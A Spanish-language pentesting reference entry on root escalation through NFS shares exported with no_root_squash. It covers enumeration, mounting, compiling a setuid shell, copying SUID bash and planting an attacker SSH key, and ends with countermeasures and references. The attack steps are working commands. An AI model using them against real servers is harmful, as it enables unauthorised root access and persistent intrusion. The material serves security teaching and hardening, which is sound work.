# Escalada de Privilegios vía NFS no_root_squash

## Descripción
Network File System (NFS) es un protocolo que permite compartir directorios a través de la red. Cuando un export NFS está configurado con la opción `no_root_squash`, el servidor no aplica "root squashing" — es decir, no remapea las solicitudes del usuario root remoto a un usuario sin privilegios (nobody). Esto significa que un atacante con acceso root en su propia máquina puede montar el export NFS, crear binarios SUID propiedad de root en el recurso compartido, y luego ejecutarlos en el servidor víctima para obtener shell como root. Esta misconfiguration es relativamente común en entornos internos.

## Clasificación
- **Fase**: Post-Explotación
- **MITRE ATT&CK**: T1548.001 (Abuse Elevation Control Mechanism: Setuid and Setgid)
- **Plataforma**: Linux
- **Dificultad**: Intermedia

## Herramientas
- **showmount** (`-e`) — enumerar exports NFS disponibles
- **mount** (`-t nfs`) — montar recursos compartidos NFS
- **nmap** (`--script nfs-ls,nfs-showmount,nfs-statfs`) — enumeración automatizada de NFS
- **gcc** — compilación de binarios SUID para escalar privilegios

## Comandos / Ejemplos

### Enumeración de exports NFS
```bash
# Listar exports disponibles en el servidor
showmount -e 10.10.10.50
# Resultado:
# Export list for 10.10.10.50:
# /home/backup *
# /var/nfs   *(rw,no_root_squash)

# Enumeración con nmap
nmap -p 2049 --script nfs-ls,nfs-showmount,nfs-statfs 10.10.10.50

# Verificar configuración en el servidor (si se tiene acceso)
cat /etc/exports
# Resultado: /var/nfs *(rw,sync,no_root_squash)
```

### Explotación: creación de binario SUID
```bash
# En la máquina del atacante (como root):

# 1. Crear directorio de montaje
mkdir /tmp/nfs_mount

# 2. Montar el export NFS
mount -t nfs 10.10.10.50:/var/nfs /tmp/nfs_mount

# 3. Crear binario que ejecute shell como root
cat > /tmp/nfs_mount/shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF

# 4. Compilar y establecer bit SUID
gcc /tmp/nfs_mount/shell.c -o /tmp/nfs_mount/shell
chmod +s /tmp/nfs_mount/shell

# 5. Verificar permisos
ls -la /tmp/nfs_mount/shell
# -rwsr-sr-x 1 root root 16712 ... shell
```

### Explotación alternativa: copiar bash con SUID
```bash
# Montar el export NFS como root
mount -t nfs 10.10.10.50:/var/nfs /tmp/nfs_mount

# Copiar bash y establecer SUID
cp /bin/bash /tmp/nfs_mount/rootbash
chmod +s /tmp/nfs_mount/rootbash

# En el servidor víctima, ejecutar:
/var/nfs/rootbash -p
# Resultado: shell con euid root
```

### Explotación: escribir en /etc/passwd
```bash
# Si el export incluye /etc o /home con no_root_squash
mount -t nfs 10.10.10.50:/home /tmp/nfs_mount

# Escribir SSH authorized_keys para acceso como otro usuario
mkdir -p /tmp/nfs_mount/target_user/.ssh
echo "ssh-rsa AAAA... attacker@kali" > /tmp/nfs_mount/target_user/.ssh/authorized_keys
chmod 600 /tmp/nfs_mount/target_user/.ssh/authorized_keys
```

## Contramedidas
- Usar `root_squash` (opción por defecto) en todos los exports NFS — nunca configurar `no_root_squash`
- Limitar los exports NFS a IPs o subredes específicas en `/etc/exports` en lugar de usar `*`
- Aplicar `nosuid` como opción de montaje en el lado del cliente y del servidor
- Usar NFSv4 con autenticación Kerberos en lugar de confiar solo en la IP del cliente
- Revisar periódicamente `/etc/exports` para detectar configuraciones inseguras
- Considerar alternativas como SSHFS o SMB con autenticación robusta para compartir archivos

## Referencias
- MITRE Corporation. (2024). ATT&CK Technique T1548.001: Abuse Elevation Control Mechanism: Setuid and Setgid. https://attack.mitre.org/techniques/T1548/001/
- Allen, L. (2018). *Mastering Kali Linux for Advanced Penetration Testing* (2nd ed.). Packt Publishing.
- OccupyTheWeb. (2018). *Linux Basics for Hackers*. No Starch Press.
